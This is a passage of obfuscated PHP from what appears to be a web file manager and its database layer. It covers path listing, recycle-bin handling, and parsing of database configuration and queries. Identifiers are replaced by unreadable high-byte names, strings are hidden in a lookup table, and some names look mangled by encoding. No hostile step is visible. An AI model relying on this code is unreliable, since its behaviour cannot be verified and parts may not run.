($¶Ãµºå«[$‚ÉçØÅã[468]] == $‚ÉçØÅã[101] && $¶Ãµºå«[$‚ÉçØÅã[193]] != 0) { $Û†’©£æ[$ºÔ£—¬û] = $¶Ãµºå«[$‚ÉçØÅã[32]]; } if ($¶Ãµºå«[$‚ÉçØÅã[468]] == $‚ÉçØÅã[101] && $¶Ãµºå«[$‚ÉçØÅã[193]] == 0) { $Û†’©£æ[$ºÔ£—¬û] = $this->_listAppendPathRoot($¶Ãµºå«, array()); } if (isset($ËÈ‰´Ï²[$¶Ãµºå«[$‚ÉçØÅã[568]]])) { continue; } $ËÈ‰´Ï²[$¶Ãµºå«[$‚ÉçØÅã[568]]] = !0; $áƒ¡Ë = $this->parentLevelArray($¶Ãµºå«[$‚ÉçØÅã[568]]); foreach ($áƒ¡Ë as $Á¤ÛÓÄ‡ => $Â¨ó¢ö›) { if (isset($Û†’©£æ[$Â¨ó¢ö›])) { continue; } if ($Á¤ÛÓÄ‡ == 0) { $Û†’©£æ[$Â¨ó¢ö›] = $this->_listAppendPathRoot($¶Ãµºå«, $áƒ¡Ë); } if ($Á¤ÛÓÄ‡ != 0) { $ÓŠç²Ã[] = $Â¨ó¢ö›; } } } unset($¶Ãµºå«); $ÓŠç²Ã = array_unique($ÓŠç²Ã); if (count($ÓŠç²Ã) > 0) { $‹ü¾Íò» = array($‚ÉçØÅã[474] => array($‚ÉçØÅã[475], $ÓŠç²Ã)); if (count($ÓŠç²Ã) == 1) { $ÓÎê½¥ã = $this->sourceInfo($ÓŠç²Ã[0]); $ñµê’š = is_array($ÓÎê½¥ã) ? array($ÓÎê½¥ã) : !1; } else { $ñµê’š = $this->field($‚ÉçØÅã[575])->where($‹ü¾Íò»)->select(); } if (!$ñµê’š) { $ñµê’š = array(); } foreach ($ñµê’š as $­®•­Î“) { $Û†’©£æ[$­®•­Î“[$‚ÉçØÅã[194]]] = $­®•­Î“[$‚ÉçØÅã[32]]; } } $™ïá»Å = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ó¯‰¨¼ = array(); foreach ($şØô÷à¹ as &$¶Ãµºå«) { $Ü‡ÛœÕ = $¶Ãµºå«[$‚ÉçØÅã[568]]; $×ãâ´ì° = $‚ÉçØÅã[12]; if (isset($Ó¯‰¨¼[$Ü‡ÛœÕ])) { $×ãâ´ì° = $Ó¯‰¨¼[$Ü‡ÛœÕ]; } else { $áƒ¡Ë = $this->parentLevelArray($¶Ãµºå«[$‚ÉçØÅã[568]]); foreach ($áƒ¡Ë as $Á¤ÛÓÄ‡ => $Â¨ó¢ö›) { if (isset($Û†’©£æ[$Â¨ó¢ö›])) { $×ãâ´ì° .= $Û†’©£æ[$Â¨ó¢ö›] . $‚ÉçØÅã[8]; } } $Ó¯‰¨¼[$Ü‡ÛœÕ] = $×ãâ´ì°; } $×ãâ´ì° .= $¶Ãµºå«[$‚ÉçØÅã[32]]; if ($¶Ãµºå«[$‚ÉçØÅã[468]] == $‚ÉçØÅã[101]) { $×ãâ´ì° .= $‚ÉçØÅã[8]; } $¶Ãµºå«[$‚ÉçØÅã[566]] = str_replace($‚ÉçØÅã[576], $‚ÉçØÅã[8], $×ãâ´ì°); if ($¶Ãµºå«[$‚ÉçØÅã[193]] == $‚ÉçØÅã[229]) { $¶Ãµºå«[$‚ÉçØÅã[32]] = trim($Û†’©£æ[$¶Ãµºå«[$‚ÉçØÅã[194]]], $‚ÉçØÅã[8]); $¶Ãµºå«[$‚ÉçØÅã[566]] = $¶Ãµºå«[$‚ÉçØÅã[32]] . $‚ÉçØÅã[8]; } if (intval($¶Ãµºå«[$‚ÉçØÅã[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¶Ãµºå«, $áƒ¡Ë, $™ïá»Å); } } unset($¶Ãµºå«); return $şØô÷à¹; } private function _listAppendPathRecycle(&$ÅÍ§şÎš, $ş­—–½Ã, $ÒÇ²¸ø) { $‰º°€‘Š =& $_SERVER[Ñ¯©ç]; if (!in_array($ÒÇ²¸ø, $ş­—–½Ã) && $ÅÍ§şÎš[$‰º°€‘Š[194]] != $ÒÇ²¸ø) { return; } $ïŞ®‰ˆ´ = explode($‰º°€‘Š[8], trim($ÅÍ§şÎš[$‰º°€‘Š[566]], $‰º°€‘Š[8])); $·êæÚÂÆ = implode($‰º°€‘Š[8], array_slice($ïŞ®‰ˆ´, 2)); $ÅÍ§şÎš[$‰º°€‘Š[566]] = $‰º°€‘Š[8] . LNG($‰º°€‘Š[577]) . $‰º°€‘Š[8] . ltrim($·êæÚÂÆ, $‰º°€‘Š[8]); $ÅÍ§şÎš[$‰º°€‘Š[568]] = $‰º°€‘Š[578] . implode($‰º°€‘Š[50], array_slice($ş­—–½Ã, 1)) . $‰º°€‘Š[50]; if ($ÅÍ§şÎš[$‰º°€‘Š[194]] == $ÒÇ²¸ø) { $ÅÍ§şÎš[$‰º°€‘Š[568]] = $‰º°€‘Š[578]; $ÅÍ§şÎš[$‰º°€‘Š[193]] = $‰º°€‘Š[229]; $ÅÍ§şÎš[$‰º°€‘Š[32]] = LNG($‰º°€‘Š[577]); } $ÅÍ§şÎš[$‰º°€‘Š[579]] = $‰º°€‘Š[580]; } protected function _listAppendPathRoot(&$²¦”èƒø, $”ı…õï²) { $¾ñÔ»ç =& $_SERVER[Ñ¯©ç]; static $ÛÆ’Êö = false; $÷óèÌš’ = $¾ñÔ»ç[12]; if ($²¦”èƒø[$¾ñÔ»ç[191]] == self::TYPE_USER) { if ($²¦”èƒø[$¾ñÔ»ç[553]] == USER_ID) { $÷óèÌš’ = LNG($¾ñÔ»ç[581]); if ($ÛÆ’Êö === !1) { $şöŒÒè… = Model($¾ñÔ»ç[582])->getInfoFull(USER_ID); $ÛÆ’Êö = _get($şöŒÒè…, $¾ñÔ»ç[583], $¾ñÔ»ç[12]); } if ($”ı…õï² && $”ı…õï²[0] == $ÛÆ’Êö || !$”ı…õï² && $²¦”èƒø[$¾ñÔ»ç[194]] == $ÛÆ’Êö) { $÷óèÌš’ = LNG($¾ñÔ»ç[584]); $²¦”èƒø[$¾ñÔ»ç[585]] = $¾ñÔ»ç[586]; } if (!$”ı…õï²) { $²¦”èƒø[$¾ñÔ»ç[32]] = $÷óèÌš’; } } else { $²¦”èƒø[$¾ñÔ»ç[587]] = Model($¾ñÔ»ç[561])->getInfoSimpleOuter($²¦”èƒø[$¾ñÔ»ç[553]]); $÷óèÌš’ = LNG($¾ñÔ»ç[588]) . $¾ñÔ»ç[176] . $²¦”èƒø[$¾ñÔ»ç[587]][$¾ñÔ»ç[32]] . $¾ñÔ»ç[178]; } } else { if ($²¦”èƒø[$¾ñÔ»ç[191]] == self::TYPE_GROUP) { $ñ¾Ç–”³ = Model($¾ñÔ»ç[569])->getInfoSimple($²¦”èƒø[$¾ñÔ»ç[553]]); $÷óèÌš’ = $ñ¾Ç–”³[$¾ñÔ»ç[32]]; } else { if ($²¦”èƒø[$¾ñÔ»ç[191]] == self::TYPE_SYSTEM) { $÷óèÌš’ = $¾ñÔ»ç[589]; } } } $÷óèÌš’ = $÷óèÌš’ ? $¾ñÔ»ç[8] . $÷óèÌš’ . $¾ñÔ»ç[8] : $¾ñÔ»ç[8]; return $÷óèÌš’; } protected function _listAppendUser(&$ê§”şİ) { $ëŞÉ•óô =& $_SERVER[Ñ¯©ç]; $°…æì¶œ = array_to_keyvalue($ê§”şİ, $ëŞÉ•óô[12], $ëŞÉ•óô[510]); $À§¹òÀ÷ = array_to_keyvalue($ê§”şİ, $ëŞÉ•óô[12], $ëŞÉ•óô[512]); $Œƒö®çÃ = array_merge($°…æì¶œ, $À§¹òÀ÷); $ç…øĞíù = Model($ëŞÉ•óô[582])->userListInfo($Œƒö®çÃ); foreach ($ê§”şİ as &$ğö™œ—Õ) { $„à¯ù‡ = $ğö™œ—Õ[$ëŞÉ•óô[510]]; $ğö™œ—Õ[$ëŞÉ•óô[510]] = $ç…øĞíù[$„à¯ù‡] ? $ç…øĞíù[$„à¯ù‡] : !1; $„à¯ù‡ = $ğö™œ—Õ[$ëŞÉ•óô[512]]; $ğö™œ—Õ[$ëŞÉ•óô[512]] = $ç…øĞíù[$„à¯ù‡] ? $ç…øĞíù[$„à¯ù‡] : !1; if (isset($ğö™œ—Õ[$ëŞÉ•óô[522]]) && $ğö™œ—Õ[$ëŞÉ•óô[522]][$ëŞÉ•óô[590]]) { $‘¬ÁÛÆ = $GLOBALS[$ëŞÉ•óô[6]][$ëŞÉ•óô[102]][$ëŞÉ•óô[591]]; if ($ğö™œ—Õ[$ëŞÉ•óô[522]][$ëŞÉ•óô[592]] <= time() - $‘¬ÁÛÆ) { $this->metaSet($ğö™œ—Õ[$ëŞÉ•óô[194]], $ëŞÉ•óô[590], null); $this->metaSet($ğö™œ—Õ[$ëŞÉ•óô[194]], $ëŞÉ•óô[592], null); unset($ğö™œ—Õ[$ëŞÉ•óô[522]][$ëŞÉ•óô[590]]); continue; } $×ñé†œ = $ğö™œ—Õ[$ëŞÉ•óô[522]][$ëŞÉ•óô[590]]; $ğö™œ—Õ[$ëŞÉ•óô[522]][$ëŞÉ•óô[593]] = Model($ëŞÉ•óô[582])->getInfoSimpleOuter($×ñé†œ); } } unset($ğö™œ—Õ); } public function parentLevelArray($Áø¦çñ) { $ÅÎÉï›Ä =& $_SERVER[Ñ¯©ç]; $Áø¦çñ = explode($ÅÎÉï›Ä[50], trim($Áø¦çñ, $ÅÎÉï›Ä[50])); return array_remove_value($Áø¦çñ, $ÅÎÉï›Ä[229]); } public function listAll($ÕÊÑ ±) { $Áçã‚à =& $_SERVER[Ñ¯©ç]; $ï•äÛÕü = $this->sourceInfo($ÕÊÑ ±); $¯¡é«ºº = array($Áçã‚à[594] => array($Áçã‚à[595], $ï•äÛÕü[$Áçã‚à[568]] . $ÕÊÑ ± . $Áçã‚à[596]), $Áçã‚à[597] => 0); $Œº´¯Ö = $Áçã‚à[598]; $¿—€–ø = "\x4c\x45\x46\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\146\151\x6c\145\x20\x66\x69\154\x65\x20\x6f\x6e\40\x73\x6f\x75\x72\143\145\x2e\146\x69\154\x65\111\104\40\75\40\146\151\x6c\145\56\x66\x69\154\145\111\104"; $¦êĞí˜Ş = $this->alias($Áçã‚à[502])->field($Œº´¯Ö)->where($¯¡é«ºº)->join($¿—€–ø)->select(); $this->_listAppendAuth($¦êĞí˜Ş); $this->_listAppendUser($¦êĞí˜Ş); $this->_listAppendPath($¦êĞí˜Ş); $¦êĞí˜Ş = array_to_keyvalue($¦êĞí˜Ş, $Áçã‚à[194]); $íùÔ†çß = "\x2f{$ï•äÛÕü[$Áçã‚à[32]]}\x2f"; $íùÔ†çß = $íùÔ†çß == $Áçã‚à[576] ? $Áçã‚à[8] : $íùÔ†çß; $İÇİª¯ = array(); foreach ($¦êĞí˜Ş as $¼‚úç¾ => $À·Â‚Ô») { $ï¡²è = $this->parentLevelArray($À·Â‚Ô»[$Áçã‚à[568]]); array_shift($ï¡²è); $ËºŸ£ØÍ = $íùÔ†çß; for ($‰ºÁ´ˆ´ = 0; $‰ºÁ´ˆ´ < count($ï¡²è); $‰ºÁ´ˆ´++) { $ËºŸ£ØÍ .= $¦êĞí˜Ş[$ï¡²è[$‰ºÁ´ˆ´]][$Áçã‚à[32]] . $Áçã‚à[8]; } $ËºŸ£ØÍ .= $À·Â‚Ô»[$Áçã‚à[32]]; if ($À·Â‚Ô»[$Áçã‚à[468]]) { $ËºŸ£ØÍ .= $Áçã‚à[8]; } $‘ñ˜˜©Í = array($Áçã‚à[478] => str_replace($Áçã‚à[576], $Áçã‚à[8], str_replace($Áçã‚à[576], $Áçã‚à[8], str_replace($Áçã‚à[576], $Áçã‚à[8], $ËºŸ£ØÍ))), $Áçã‚à[599] => intval($À·Â‚Ô»[$Áçã‚à[468]]), $Áçã‚à[600] => intval($À·Â‚Ô»[$Áçã‚à[89]]), $Áçã‚à[98] => intval($À·Â‚Ô»[$Áçã‚à[98]]), $Áçã‚à[100] => $this->pathInfoFilter($À·Â‚Ô»)); if (!$‘ñ˜˜©Í[$Áçã‚à[468]]) { $‘ñ˜˜©Í[$Áçã‚à[524]] = $À·Â‚Ô»[$Áçã‚à[524]]; } $İÇİª¯[] = $‘ñ˜˜©Í; } $İÇİª¯ = array_sort_by($İÇİª¯, $Áçã‚à[97]); return $İÇİª¯; } } goto Fì¤å±¼»®; dÄ ˆ„Ê§„: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\145\x71" => "\x3c\x3e", "\x67\164" => "\x3e", "\145\147\x74" => "\76\x3d", "\x6c\164" => "\74", "\x65\x6c\x74" => "\74\75", "\156\157\164\154\x69\153\145" => "\116\x4f\124\40\114\x49\x4b\x45", "\x6c\x69\153\x65" => "\x4c\111\113\x45", "\151\x6e" => "\111\x4e", "\156\x6f\164\x69\x6e" => "\116\117\124\40\111\x4e", "\156\157\x74\40\x69\156" => "\x4e\x4f\124\40\x49\x4e", "\142\x65\164\x77\x65\145\x6e" => "\x42\x45\124\127\x45\105\x4e", "\x6e\x6f\x74\x62\x65\x74\167\145\145\x6e" => "\x4e\117\x54\40\102\x45\x54\x57\105\x45\x4e", "\x6e\157\x74\x20\x62\x65\x74\167\x65\145\156" => "\116\117\x54\x20\x42\105\x54\x57\105\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\103\124\x25\104\x49\123\124\111\116\103\x54\x25\x20\x25\106\x49\105\114\104\x25\40\106\122\x4f\x4d\40\45\x54\101\102\x4c\105\45\x25\x4a\x4f\x49\x4e\x25\x25\x57\x48\x45\x52\105\45\x25\x47\122\x4f\125\120\x25\45\x48\x41\x56\x49\x4e\x47\x25\x25\117\122\x44\x45\122\45\x25\x4c\x49\115\x49\124\x25\x20\45\x55\116\111\x4f\116\45\45\x43\117\115\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $Äæİ¹“¡ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ñ¯©ç][1013], $Äæİ¹“¡); } public function factory($ıÈŠìÉ = '') { $á’¦ñª¥ =& $_SERVER[Ñ¯©ç]; $ıÈŠìÉ = $this->parseConfig($ıÈŠìÉ); if (empty($ıÈŠìÉ[$á’¦ñª¥[1014]])) { think_exception(think_lang($á’¦ñª¥[1015])); } $this->dbType = ucwords(strtolower($ıÈŠìÉ[$á’¦ñª¥[1014]])); $©¹Ş’™ü = $á’¦ñª¥[1016] . $this->dbType; if (class_exists($©¹Ş’™ü)) { $‹¹­´Ñ‰ = new $©¹Ş’™ü($ıÈŠìÉ); if ($á’¦ñª¥[1017] != strtolower($ıÈŠìÉ[$á’¦ñª¥[1014]])) { $‹¹­´Ñ‰->dbType = strtoupper($this->dbType); } else { $‹¹­´Ñ‰->dbType = $this->_getDsnType($ıÈŠìÉ[$á’¦ñª¥[969]]); } } else { think_exception(think_lang($á’¦ñª¥[1018]) . $á’¦ñª¥[1019] . $©¹Ş’™ü); } return $‹¹­´Ñ‰; } public function __call($ß‰—÷ŞÎ, $ÕÜ§Ó¶–) { if (method_exists($this, $ß‰—÷ŞÎ)) { return call_user_func_array(array($this, $ß‰—÷ŞÎ), $ÕÜ§Ó¶–); } } protected function _getDsnType($§ƒìÜÛ) { $·³„ê½ = explode($_SERVER[Ñ¯©ç][4], $§ƒìÜÛ); $•©Ï€•ô = strtoupper(trim($·³„ê½[0])); return $•©Ï€•ô; } private function parseConfig($”½²×ì¬ = '') { $ß²ÖĞÒš =& $_SERVER[Ñ¯©ç]; if (!empty($”½²×ì¬) && is_string($”½²×ì¬)) { $”½²×ì¬ = $this->parseDSN($”½²×ì¬); } elseif (is_array($”½²×ì¬)) { $”½²×ì¬ = array_change_key_case($”½²×ì¬); $”½²×ì¬ = array($ß²ÖĞÒš[1014] => $”½²×ì¬[$ß²ÖĞÒš[1020]], $ß²ÖĞÒš[941] => $”½²×ì¬[$ß²ÖĞÒš[1021]], $ß²ÖĞÒš[942] => $”½²×ì¬[$ß²ÖĞÒš[1022]], $ß²ÖĞÒš[939] => $”½²×ì¬[$ß²ÖĞÒš[1023]], $ß²ÖĞÒš[940] => $”½²×ì¬[$ß²ÖĞÒš[1024]], $ß²ÖĞÒš[21] => $”½²×ì¬[$ß²ÖĞÒš[1025]], $ß²ÖĞÒš[969] => $”½²×ì¬[$ß²ÖĞÒš[1026]], $ß²ÖĞÒš[17] => isset($”½²×ì¬[$ß²ÖĞÒš[1027]]) ? $”½²×ì¬[$ß²ÖĞÒš[1027]] : array()); } elseif (empty($”½²×ì¬)) { if (think_config($ß²ÖĞÒš[1028]) && $ß²ÖĞÒš[1017] != strtolower(think_config($ß²ÖĞÒš[1029]))) { $”½²×ì¬ = $this->parseDSN(think_config($ß²ÖĞÒš[1028])); } else { $”½²×ì¬ = array($ß²ÖĞÒš[1014] => think_config($ß²ÖĞÒš[1029]), $ß²ÖĞÒš[941] => think_config($ß²ÖĞÒš[1030]), $ß²ÖĞÒš[942] => think_config($ß²ÖĞÒš[1031]), $ß²ÖĞÒš[939] => think_config($ß²ÖĞÒš[1032]), $ß²ÖĞÒš[940] => think_config($ß²ÖĞÒš[1033]), $ß²ÖĞÒš[21] => think_config($ß²ÖĞÒš[307]), $ß²ÖĞÒš[969] => think_config($ß²ÖĞÒš[1028]), $ß²ÖĞÒš[17] => think_config($ß²ÖĞÒš[1034])); } } return $”½²×ì¬; } protected function initConnect($•Îû‰à = true) { if (1 == think_config($_SERVER[Ñ¯©ç][22])) { $this->_linkID = $this->multiConnect($•Îû‰à); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $š´ŠËµ­ => $º×–ìĞÜ) { $this->_linkID = $º×–ìĞÜ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ë™ÂÉ€¥ = false) { $ùé˜ÔŠĞ =& $_SERVER[Ñ¯©ç]; static $¸Ğ¥£æì = array(); static $ˆâ–—ü˜ = -1; if (empty($¸Ğ¥£æì)) { foreach ($this->config as $¯ÇğÍ¦ => $·È©÷òµ) { $¸Ğ¥£æì[$¯ÇğÍ¦] = explode($ùé˜ÔŠĞ[50], $·È©÷òµ); } } if (think_config($ùé˜ÔŠĞ[1035])) { if ($Ë™ÂÉ€¥ || think_config($ùé˜ÔŠĞ[454]) === !0) { $ÓÓÆªÁ‡ = floor(mt_rand(0, think_config($ùé˜ÔŠĞ[1036]) - 1)); $ˆâ–—ü˜ = $ÓÓÆªÁ‡; } else { if (is_numeric(think_config($ùé˜ÔŠĞ[1037]))) { $ÓÓÆªÁ‡ = think_config($ùé˜ÔŠĞ[1037]); } else { $ÓÓÆªÁ‡ = floor(mt_rand(think_config($ùé˜ÔŠĞ[1036]), count($¸Ğ¥£æì[$ùé˜ÔŠĞ[939]]) - 1)); } } } else { $ÓÓÆªÁ‡ = floor(mt_rand(0, count($¸Ğ¥£æì[$ùé˜ÔŠĞ[939]]) - 1)); $ˆâ–—ü˜ = $ÓÓÆªÁ‡; } $ÓÓÆªÁ‡ = $ˆâ–—ü˜ !== -1 ? $ˆâ–—ü˜ : $ÓÓÆªÁ‡; $ÑËŞÛ€² = array($ùé˜ÔŠĞ[941] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[941]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[941]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[941]][0], $ùé˜ÔŠĞ[942] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[942]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[942]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[942]][0], $ùé˜ÔŠĞ[939] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[939]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[939]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[939]][0], $ùé˜ÔŠĞ[940] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[940]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[940]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[940]][0], $ùé˜ÔŠĞ[21] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[21]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[21]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[21]][0], $ùé˜ÔŠĞ[969] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[969]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[969]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[969]][0], $ùé˜ÔŠĞ[17] => isset($¸Ğ¥£æì[$ùé˜ÔŠĞ[17]][$ÓÓÆªÁ‡]) ? $¸Ğ¥£æì[$ùé˜ÔŠĞ[17]][$ÓÓÆªÁ‡] : $¸Ğ¥£æì[$ùé˜ÔŠĞ[17]][0]); return $this->connect($ÑËŞÛ€², $ÓÓÆªÁ‡); } public function parseDSN($ÀÇ·ìüÉ) { $ƒÆ´ˆü =& $_SERVER[Ñ¯©ç]; if (empty($ÀÇ·ìüÉ)) { return !1; } $öù×ì¾¥ = parse_url($ÀÇ·ìüÉ); if ($öù×ì¾¥[$ƒÆ´ˆü[208]]) { $Éú¹È¿ = array($ƒÆ´ˆü[1014] => $öù×ì¾¥[$ƒÆ´ˆü[208]], $ƒÆ´ˆü[941] => isset($öù×ì¾¥[$ƒÆ´ˆü[645]]) ? $öù×ì¾¥[$ƒÆ´ˆü[645]] : $ƒÆ´ˆü[12], $ƒÆ´ˆü[942] => isset($öù×ì¾¥[$ƒÆ´ˆü[1038]]) ? $öù×ì¾¥[$ƒÆ´ˆü[1038]] : $ƒÆ´ˆü[12], $ƒÆ´ˆü[939] => isset($öù×ì¾¥[$ƒÆ´ˆü[209]]) ? $öù×ì¾¥[$ƒÆ´ˆü[209]] : $ƒÆ´ˆü[12], $ƒÆ´ˆü[940] => isset($öù×ì¾¥[$ƒÆ´ˆü[210]]) ? $öù×ì¾¥[$ƒÆ´ˆü[210]] : $ƒÆ´ˆü[12], $ƒÆ´ˆü[21] => isset($öù×ì¾¥[$ƒÆ´ˆü[97]]) ? substr($öù×ì¾¥[$ƒÆ´ˆü[97]], 1) : $ƒÆ´ˆü[12]); } else { preg_match($ƒÆ´ˆü[1039], trim($ÀÇ·ìüÉ), $ÏÄì‰ºı); $Éú¹È¿ = array($ƒÆ´ˆü[1014] => $ÏÄì‰ºı[1], $ƒÆ´ˆü[941] => $ÏÄì‰ºı[2], $ƒÆ´ˆü[942] => $ÏÄì‰ºı[3], $ƒÆ´ˆü[939] => $ÏÄì‰ºı[4], $ƒÆ´ˆü[940] => $ÏÄì‰ºı[5], $ƒÆ´ˆü[21] => $ÏÄì‰ºı[6]); } $Éú¹È¿[$ƒÆ´ˆü[969]] = $ƒÆ´ˆü[12]; return $Éú¹È¿; } protected function debug() { $ìé‡á­Ô =& $_SERVER[Ñ¯©ç]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ìé‡á­Ô[1040]; if (think_config($ìé‡á­Ô[1041])) { think_status($ìé‡á­Ô[1042]); think_trace($this->queryStr . $ìé‡á­Ô[1043] . think_status($ìé‡á­Ô[24], $ìé‡á­Ô[1042], 6) . $ìé‡á­Ô[1044], $ìé‡á­Ô[12], $ìé‡á­Ô[1045]); } } protected function parseLock($ğÒ‡½¼Ù = false) { $Á™Ûå‡¯ =& $_SERVER[Ñ¯©ç]; if (!$ğÒ‡½¼Ù) { return $Á™Ûå‡¯[12]; } if ($Á™Ûå‡¯[971] == $this->dbType) { return $Á™Ûå‡¯[1046]; } return $Á™Ûå‡¯[1047]; } protected function parseSet($ëÈÖ‹íì) { $±òÂ«ñŞ =& $_SERVER[Ñ¯©ç]; foreach ($ëÈÖ‹íì as $­Å‰½· => $ÅûİÁ†å) { if (is_array($ÅûİÁ†å) && $±òÂ«ñŞ[357] == $ÅûİÁ†å[0]) { $ÛãÉè‚[] = $this->parseKey($­Å‰½·) . $±òÂ«ñŞ[937] . $ÅûİÁ†å[1]; } elseif (is_scalar($ÅûİÁ†å) || is_null($ÅûİÁ†å)) { $ÛãÉè‚[] = $this->parseKey($­Å‰½·) . $±òÂ«ñŞ[937] . $this->parseValue($ÅûİÁ†å); } } return $±òÂ«ñŞ[1048] . implode($±òÂ«ñŞ[50], $ÛãÉè‚); } protected function bindParam($´äÆî…, $ˆşŒ˜Œ¹) { $this->bind[$_SERVER[Ñ¯©ç][4] . $´äÆî…] = $ˆşŒ˜Œ¹; } protected function parseBind($éáİ´„Á) { $éáİ´„Á = array_merge($this->bind, $éáİ´„Á); $this->bind = array(); return $éáİ´„Á; } function parseKey(&$±¾ÄÁÍ, $¥…”Ú¼ = true) { if ($¥…”Ú¼) { $±¾ÄÁÍ = $this->parseKeyCheck($±¾ÄÁÍ); } return $±¾ÄÁÍ; } function parseKeyCheck($£ªÓ°) { $Ú²Ê‹È¸ =& $_SERVER[Ñ¯©ç]; $£ªÓ° = trim($£ªÓ°); if (!preg_match($Ú²Ê‹È¸[1049], $£ªÓ°)) { think_exception($Ú²Ê‹È¸[1050] . $£ªÓ°); } return $£ªÓ°; } protected function parseValue($ËÚ ´üŒ) { $½™‚ó¿Ú =& $_SERVER[Ñ¯©ç]; if (is_string($ËÚ ´üŒ)) { $ËÚ ´üŒ = $½™‚ó¿Ú[1010] . $this->escapeString($ËÚ ´üŒ) . $½™‚ó¿Ú[1010]; } elseif (isset($ËÚ ´üŒ[0]) && is_string($ËÚ ´üŒ[0]) && strtolower($ËÚ ´üŒ[0]) == $½™‚ó¿Ú[357]) { $ËÚ ´üŒ = $this->escapeString($ËÚ ´üŒ[1]); } elseif (is_array($ËÚ ´üŒ)) { $ËÚ ´üŒ = array_map(array($this, $½™‚ó¿Ú[1011]), $ËÚ ´üŒ); } elseif (is_bool($ËÚ ´üŒ)) { $ËÚ ´üŒ = $ËÚ ´üŒ ? $½™‚ó¿Ú[101] : $½™‚ó¿Ú[229]; } elseif (is_null($ËÚ ´üŒ)) { $ËÚ ´üŒ = $½™‚ó¿Ú[116]; } return $ËÚ ´üŒ; } protected function parseField($…ˆÑŸŠ¥) { $×Ò¶›ì¡ =& $_SERVER[Ñ¯©ç]; if (is_string($…ˆÑŸŠ¥) && strpos($…ˆÑŸŠ¥, $×Ò¶›ì¡[50])) { $…ˆÑŸŠ¥ = explode($×Ò¶›ì¡[50], $…ˆÑŸŠ¥); } if (is_array($…ˆÑŸŠ¥)) { $‘Ä¿î¬ = array(); foreach ($…ˆÑŸŠ¥ as $õ›ˆûı¯ => $„íÚë´) { if (!is_numeric($õ›ˆûı¯)) { $‘Ä¿î¬[] = $this->parseKey($õ›ˆûı¯, !1) . $×Ò¶›ì¡[1051] . $this->parseKey($„íÚë´); } else { $‘Ä¿î¬[] = $this->parseKey($„íÚë´); } } $âò§Ÿœ¿ = implode($×Ò¶›ì¡[50], $‘Ä¿î¬); } elseif (is_string($…ˆÑŸŠ¥) && !empty($…ˆÑŸŠ¥)) { $âò§Ÿœ¿ = $…ˆÑŸŠ¥; } else { $âò§Ÿœ¿ = $×Ò¶›ì¡[221]; } return $âò§Ÿœ¿; } protected function parseTable($Œ“‹òËÖ) { $Áığóá =& $_SERVER[Ñ¯©ç]; if (is_array($Œ“‹òËÖ)) { $Áû™áÇ“ = array(); foreach ($Œ“‹òËÖ as $Éöò¦†” => $ıõ›‚òì) { if (!is_numeric($Éöò¦†”)) { $Áû™áÇ“[] = $this->parseKey($Éöò¦†”) . $Áığóá[53] . $this->parseKey($ıõ›‚òì); } else { $Áû™áÇ“[] = $this->parseKey($Éöò¦†”); } } $Œ“‹òËÖ = $Áû™áÇ“; } elseif (is_string($Œ“‹òËÖ)) { if (strstr($Œ“‹òËÖ, $Áığóá[53])) { return $Œ“‹òËÖ; } $Œ“‹òËÖ = explode($Áığóá[50], $Œ“‹òËÖ); array_walk($Œ“‹òËÖ, array($this, $Áığóá[959])); } return $Áığóá[953] . trim(implode($Áığóá[1052], $Œ“‹òËÖ), $Áığóá[444]) . $Áığóá[953]; } protected function parseWhere($Íá²£Ó) { $‡“æ¥û =& $_SERVER[Ñ¯©ç]; $ş³ƒ¨Şë = $‡“æ¥û[12]; if (is_string($Íá²£Ó)) { $ş³ƒ¨Şë = $Íá²£Ó; } else { $ˆ¬ø¾Äì = isset($Íá²£Ó[$‡“æ¥û[1053]]) ? strtoupper($Íá²£Ó[$‡“æ¥û[1053]]) : $‡“æ¥û[12]; if (in_array($ˆ¬ø¾Äì, array($‡“æ¥û[1054], $‡“æ¥û[1055], $‡“æ¥û[1056]))) { $ˆ¬ø¾Äì = $‡“æ¥û[53] . $ˆ¬ø¾Äì . $‡“æ¥û[53]; unset($Íá²£Ó[$‡“æ¥û[1053]]); } else { $ˆ¬ø¾Äì 